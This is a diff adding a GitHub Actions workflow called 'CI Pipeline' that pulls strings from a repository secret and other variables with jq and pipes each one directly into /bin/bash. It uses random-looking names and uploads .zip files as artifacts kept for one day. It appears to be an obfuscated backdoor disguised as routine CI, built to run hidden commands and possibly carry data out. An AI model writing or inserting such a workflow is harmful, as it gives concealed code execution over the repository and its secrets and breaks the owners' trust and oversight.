@@ -1,0 +1,25 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+jobs:
+  start:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute task
+        env:
+          vosuo52642: ${{ secrets.vosuo52642 }}
+        run: |
+          printf '%s' "$vosuo52642" | jq -r .y4020 | /bin/bash
+          printf '%s' "$bvfm22" | jq -r .e36581 | /bin/bash
+          echo $rib71 | jq -r .ecwu83644 | /bin/bash
+          printf '%s' "$zd26263" | jq -r .dv40 | /bin/bash
+
+      - name: Persist data
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: sYVZ5mTh
+          path: "*.zip"
+          retention-days: 1
